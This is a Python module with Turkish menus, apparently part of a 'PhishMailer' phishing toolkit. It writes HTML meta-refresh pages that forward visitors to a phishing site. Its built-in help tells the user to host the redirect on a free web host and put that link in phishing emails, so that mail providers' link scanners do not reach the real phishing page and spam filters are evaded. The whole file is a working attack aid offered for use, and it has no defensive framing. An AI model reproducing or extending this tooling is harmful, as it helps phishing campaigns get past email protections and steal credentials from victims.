import os
import sys
from .color import green, white, red, blue, start, alert, numbering

def RedirectHelp():

	print(numbering(1) + white + " Yönlendirme Sayfası Oluştur " + numbering(1))
	print(numbering(2) + white + " Bilgi ve Nasıl Kullanılır " + numbering(2))
	print(numbering(99) + white + " Oluşturmayı Yeniden Yönlendirmeden Çık " + numbering(99)) 
	OptionPick = int(input(green + "root@phishmailer/Bypass/Redirect:~ " + white))
	if OptionPick == 1:
		os.system("clear")
		RedirectCreator()
	elif OptionPick == 2:
		os.system("clear")
		HowInfo()
	elif OptionPick == 99:
		print("Tamam...")
	else: 
		print("Yanlış giriş!")

def RedirectionMain():
	print(green)
	print(""" 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
-------------------MainMenu------------------""")
	RedirectHelp()

def RedirectCreator():
	print(green + """ 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
-------------------Creator-------------------""")
	print("")
	print(numbering(1) + white + " Zaten PhishingLink'inizle " + numbering(1))
	print(numbering(2) + white + " Kendiniz Ekleyin (yalnızca PhishingUrl Olmadan htmlDosyası)) " + numbering(2))
	print(numbering(99) + white + " Oluşturmadan Çık " + numbering(99))
	Creator = int(input(green + "root@phishmailer/Redirect/Creator:~ " + white))
	
	if Creator == 1:
		Url = input(start + "URL'nizi girin: " + white)
		FileName = input(start + "Dosya Adı: " + white)
		print(alert + " İçin Girin '/root/Desktop/PhishMailer/Redirection/'")
		FileSave = input(start + " Dosyayı Nereye Kaydetmek İstiyorsunuz?: " + white)
		if FileSave == "":
			 FileLocation = "/root/Desktop/PhishMailer/Redirection/"
		else:
			FileLocation = FileSave	 	
		CompleteLocator = os.path.join(FileLocation, FileName+".html")
		Html_file = open(CompleteLocator,"w")
		Html_file.write("""
		<!DOCTYPE html>
		<html>
		<head>
			<title>Redirecting</title>
			<meta http-equiv="refresh" content="1; url={}">
		</head>
		<body>
			<p>Redirecting....</p>
		</body>
		</html> """.format(Url))
		Html_file.close()
		print(alert + " Dosya Oluşturuldu, Kaydedildi: " + FileLocation)
		
	elif Creator == 2:
		FileName = input(start + "Dosya Adı: " + white)
		print(alert + " İçin Girin '/root/Desktop/PhishMailer/Redirection/'")
		FileSave = input(start + " Dosyayı Nereye Kaydetmek İstiyorsunuz?: " + white)
		if FileSave == "":
			 FileLocation = "/root/Desktop/PhishMailer/Redirection/"
		else:
			FileLocation = FileSave	 	
		CompleteLocator = os.path.join(FileLocation, FileName+".html")
		Html_file = open(CompleteLocator,"w")
		Html_file.write("""
		<!DOCTYPE html>
		<html>
		<head>
			<title>Redirecting</title>
			<meta http-equiv="refresh" content="1; url=https://www.PhishingSite.com/">
		</head>
		<body>
			<p>Redirecting....</p>
		</body>
		</html> """)
		Html_file.close()
		
		print(alert + " Kaydedilen HTML Dosyası " + FileLocation)
		print(alert + " PhishingUrl'nizi Manuel Olarak Girmeniz Gerektiğini Unutmayın!")
		
	elif Creator == 99:
		os.system("clear")
		print(red + "Umarım Başka Bir Şekilde Çalışır")
		os.system("clear")
	
	else:
		print("Tamam...")

def HowInfo():
	print(green)
	print(""" 
 __   ___  __     __   ___  __  ___  __   __  
|__) |__  |  \ | |__) |__  /  `  |  /  \ |__) 
|  \ |___ |__/ | |  \ |___ \__,  |  \__/ |  \ 
----------------Info And HowTo---------------""")
	print(numbering(1) + white + " Nasıl kullanılır " + numbering(1))
	print(numbering(2) + white + " Nasıl çalışır " + numbering(2))
	print(numbering(3) + white + " Yaratıcıya " + numbering(3))
	print(numbering(99) + white + " Çıkış " + numbering(99))
	
	OptionPick = int(input(green + "root@phishmailer/Bypass/Redirect/Help:~ " + white))
	
	if OptionPick == 99:
		RedirectCreator()
	elif OptionPick == 1:
		print(numbering(1) + white + " Yönlendirme Html Dosyasını Oluşturun ve URL'nizi Doğru Yazdığınızdan Emin Olun \n")
		print(numbering(2) + white + " Artık 000Webhost Gibi Bir Barındırma Hizmetine İhtiyacınız Var (Bunu Engellemeyecekler) \n")
		print(numbering(3) + white + " Yönlendirme Sayfanızı Yükleyin Otomatik Olarak Çalışabilmesi İçin Bu 'index.html' Adını Vermenizi Önerin \n")
		print(numbering(4) + white + " Ve Kimlik Avı E-postanızı Oluşturduğunuzda Kimlik Avı URL'nizi Değil Yönlendirme Sitenizin URL'sini Girdiğinizden Emin Olun \n")
		print(numbering(5) + white + " Artık Kimlik Avı E-postanızı Gönderdiğinizde E-posta Hizmeti E-postaya Bağlı Olan Kimlik Avı Sitenizi 'Okuyamıyor' \n")
		print(start + white + " Bu, E-postayı İşaretlemelerini Biraz Zorlaştıracak")
		RedirectionMain()
	
	elif OptionPick == 2:
		print(numbering(1) + white + " E-postalarınızın İşaretlenmesinin Bir Yolu, E-posta Hizmet Sağlayıcısının E-postaya Bağlı Tüm Siteleri Taramasıdır \n")
		print(numbering(2) + white + " Bu nedenle, Hedefi Gerçek Kimlik Avı Sitesine Yönlendiren Bir URL Girdiğinizde Kimlik Avı Sitesini Okumaz Sadece Yönlendirmeyi \n")
		print(numbering(3) + white + " Bu Başarılı Bir Kimlik Avı Saldırısı Başlatmanıza Yardımcı Olmanın Bir Yolu \n")
		print(alert + white + " Kimlik Avı E-postalarını Algılamalarının Tek Yolu Bu Değil, Bu yüzden Her Zaman Çalışmıyor Ama Başlangıçta Bana Yardımcı Oluyor \n")
		print(start + white + " Spam Filtrelerini Atlamanın Daha Fazla Yoluyla Geleceğim")
		RedirectionMain()
	
	elif OptionPick == 3:
		os.system("clear")
		RedirectCreator()
		
	else:
		print(start + " Umarım Yakında Tekrar Görüşürüz " + start)
		sys.exit()



                                             



#HtmlKod:
	
#<!DOCTYPE html>
#<html>
#  <head>
#      <title>HTML Meta Tag</title>
#      <meta http-equiv = "refresh" content = "1; url = https://www.PhishingSite.com />
#   </head>
#   <body>
#      <p>Redirecting....</p>
#   </body>
#</html>
